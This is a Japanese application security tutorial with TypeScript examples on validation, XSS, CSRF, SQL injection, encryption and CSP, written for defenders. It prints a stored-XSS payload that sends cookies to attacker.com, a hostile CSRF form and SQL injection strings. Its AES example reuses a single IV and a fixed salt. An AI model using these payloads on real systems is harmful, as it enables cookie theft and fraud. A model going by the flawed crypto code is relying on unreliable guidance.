# BI. アプリケーションセキュリティ

## 概要

アプリケーションセキュリティは、入力検証・サニタイゼーション・多層防御による攻撃対策、XSS・CSRF・SQLi などの一般的脆弱性への対策、暗号化による通信・保存データの保護で成り立ちます。サーバー側での厳格な検証が信頼性の基盤です。

---

## 1. 入力検証とサニタイゼーション

**役割:** 不正なデータの侵入を防ぐ

### 入力検証（Validation）

ユーザー入力がビジネスルールに合致しているか確認。

```typescript
// Zod による型安全な検証
import { z } from 'zod';

const UserSchema = z.object({
  email: z.string().email('Invalid email format'),
  age: z.number().min(0).max(150),
  username: z.string().min(3).max(20).regex(/^[a-z0-9_]+$/),
  password: z.string().min(8).refine(pwd => /[A-Z]/.test(pwd), 'Uppercase required')
});

// API での検証
export async function POST(request: Request) {
  const body = await request.json();

  try {
    const validated = UserSchema.parse(body);
    // 検証済みデータを処理
  } catch (error) {
    // 詳細なエラーメッセージは返さない（情報漏洩防止）
    return Response.json({ error: 'Invalid input' }, { status: 400 });
  }
}
```

### サニタイゼーション（Sanitization）

危険な要素を除去または無害化。

```typescript
// HTML のサニタイゼーション
import DOMPurify from 'dompurify';

function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target']
  });
}

// SQL のパラメータ化（自動的にサニタイズ）
const user = await db.user.findUnique({
  where: { email: userInput }  // パラメータ化により自動サニタイズ
});

// 不正な SQL インジェクション試行
// userInput = "admin' OR '1'='1"
// → 文字列として扱われ、インジェクションが無効化
```

---

## 2. 多層防御（Defense in Depth）

**役割:** 単一の防御を越えた攻撃に対応

```
Layer 1: ネットワーク層
  └─ WAF（Web Application Firewall）で既知攻撃を検知・ブロック

Layer 2: API層
  └─ 入力検証・認証・認可

Layer 3: アプリケーション層
  └─ SQL パラメータ化、XSS 対策

Layer 4: データベース層
  └─ 最小権限の DB ユーザー、暗号化

Layer 5: インフラ層
  └─ VPC、セキュリティグループ、暗号通信
```

**各層の役割:**
- Layer 1 が失敗 → Layer 2 で検出
- Layer 2 が失敗 → Layer 3 で検出
- Layer 3 が失敗 → Layer 4 で被害を最小化

---

## 3. XSS（Cross-Site Scripting）対策

**脅威:** 攻撃者が悪意あるスクリプトを実行

### Stored XSS（保存型）の例

```
1. 攻撃者がコメント欄に以下を投稿
   <img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)">

2. ページ閲覧者のブラウザが自動実行
3. Cookie が盗まれる
```

### 対策：HTML エスケープ

```typescript
// React（自動）
function Post({ content }: { content: string }) {
  // React は自動的に HTML をエスケープ
  return <div>{content}</div>;  // 安全
}

// Next.js（手動エスケープが必要な場合）
import { escapeHtml } from 'escape-html';

export function CommentDisplay({ comment }: { comment: string }) {
  const safe = escapeHtml(comment);
  return <div>{safe}</div>;
}

// 詳細なHTMLが必要な場合（Markdown等）
import DOMPurify from 'dompurify';

export function RichContent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

---

## 4. CSRF（Cross-Site Request Forgery）対策

**脅威:** 他のサイトから権限を悪用したリクエストを送信

### 攻撃シナリオ

```
1. ユーザーが銀行サイトにログイン（Cookie で認証状態）
2. 別のタブで悪意あるサイトにアクセス
3. そのサイトが以下を実行
   <form method="POST" action="https://bank.com/transfer">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   form.submit();

4. ユーザーの Cookie で送信されるため、転送が実行される
```

### 対策：CSRF トークン

```typescript
// POST リクエスト時にトークンを検証
import csrf from 'csrf';

const csrfProtection = (tokens: csrf.Tokens) => (req, res, next) => {
  if (req.method === 'POST') {
    const token = req.body._token || req.headers['x-csrf-token'];
    if (!tokens.verify(req.session.secret, token)) {
      return res.status(403).json({ error: 'CSRF validation failed' });
    }
  }
  next();
};

// クライアント側
export function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // サーバーから CSRF トークンを取得
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(d => setCsrfToken(d.token));
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    fetch('/api/transfer', {
      method: 'POST',
      headers: { 'X-CSRF-Token': csrfToken },
      body: JSON.stringify({ to: 'Alice', amount: 100 })
    });
  };

  return <form onSubmit={handleSubmit}>...</form>;
}
```

**SameSite Cookie で追加対策:**
```typescript
// 異なりサイトからのリクエストでCookieを送信しない
response.setHeader('Set-Cookie', [
  'sessionId=abc123; SameSite=Strict; HttpOnly; Secure'
]);
```

---

## 5. SQLインジェクション対策

**脅威:** SQL コマンドの一部として悪意あるコードを注入

### 非安全な例

```sql
-- ユーザー入力がそのまま使われる
SELECT * FROM users WHERE email = 'attacker@example.com' OR '1'='1'
-- admin@example.com' --のような入力で認証回避
```

### 対策：パラメータ化クエリ

```typescript
// Prisma（自動的にパラメータ化）
const user = await prisma.user.findUnique({
  where: { email: userInput }  // 安全（入力は値として扱われる）
});

// SQL（パラメータ化）
const query = 'SELECT * FROM users WHERE email = ?';
const result = await db.query(query, [userInput]);  // ✓安全

// 避けるべき（文字列連結）
const query = `SELECT * FROM users WHERE email = '${userInput}'`;  // ✗危険
```

---

## 6. 暗号化

### 保存データの暗号化（Encryption at Rest）

パスワード・クレジットカード・個人情報をハッシュ化または暗号化。

```typescript
import bcrypt from 'bcrypt';

// パスワード：ハッシュ化（復号不可）
const hashed = await bcrypt.hash(plainPassword, 10);
const isValid = await bcrypt.compare(plainPassword, hashed);

// クレジットカード：暗号化（復号可能）
import crypto from 'crypto';

const algorithm = 'aes-256-cbc';
const key = crypto.scryptSync(process.env.ENCRYPTION_KEY!, 'salt', 32);
const iv = crypto.randomBytes(16);

function encrypt(text: string): string {
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function decrypt(encrypted: string): string {
  const [ivStr, encryptedStr] = encrypted.split(':');
  const iv = Buffer.from(ivStr, 'hex');
  const decipher = crypto.createDecipheriv(algorithm, key, iv);
  let decrypted = decipher.update(encryptedStr, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
```

### 通信の暗号化（Encryption in Transit）

```typescript
// HTTPS の強制
export async function middleware(request: NextRequest) {
  if (!request.url.startsWith('https') && process.env.NODE_ENV === 'production') {
    return NextResponse.redirect(
      request.url.replace('http://', 'https://')
    );
  }
}

// HTTP Strict-Transport-Security ヘッダー
export function middleware() {
  const response = NextResponse.next();
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  return response;
}
```

---

## 7. 依存関係の監査

**役割:** サードパーティライブラリの脆弱性を検出

```bash
# npm での監査
npm audit

# 詳細表示
npm audit --verbose

# 自動修復
npm audit fix

# Dependabot（GitHub）
# リポジトリで有効にすると、脆弱性検出時に自動PR作成
```

**CI での自動チェック:**
```yaml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm audit
```

---

## 8. Content Security Policy（CSP）

**役割:** XSS 攻撃を軽減（インラインスクリプト実行を制限）

```typescript
// Next.js でのCSP設定
export async function middleware(request: NextRequest) {
  const response = NextResponse.next();
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
  );
  return response;
}

// より厳格
response.headers.set(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com"
);
```

---

## 9. 鍵管理のベストプラクティス

- [ ] 秘密鍵は環境変数に保存（`.env.local` など）
- [ ] 秘密鍵をリポジトリにコミットしない（`.gitignore` で除外）
- [ ] 本番環境では Key Management Service（AWS KMS等）を使用
- [ ] 鍵のローテーション戦略を定義

```typescript
// 環境変数での管理
const dbPassword = process.env.DB_PASSWORD;
const jwtSecret = process.env.JWT_SECRET;

// .env.local（Git で追跡しない）
# DB_PASSWORD=secretpassword123
# JWT_SECRET=your-secret-key-here

// .gitignore
.env.local
.env.*.local
```

---

## 10. セキュリティチェックリスト

- [ ] 全ての入力を検証し、パラメータ化クエリを使用しているか
- [ ] Cookie に HttpOnly・Secure・SameSite を設定しているか
- [ ] XSS 対策としてHTML自動エスケープまたはサニタイゼーション
- [ ] CSRF トークンを実装しているか
- [ ] パスワードはハッシュ化、クレジットカード等は暗号化しているか
- [ ] HTTPS を強制しているか（HSTS ヘッダー）
- [ ] 依存関係の脆弱性スキャンを自動化しているか
- [ ] CSP ヘッダーを設定しているか
- [ ] エラーメッセージで詳細情報を漏らしていないか

---

## まとめ

アプリケーションセキュリティは単一の対策でなく、多層防御と継続的な監視が必要です。
入力検証・暗号化・権限制御の三本柱を堅牢に構築することが重要です。
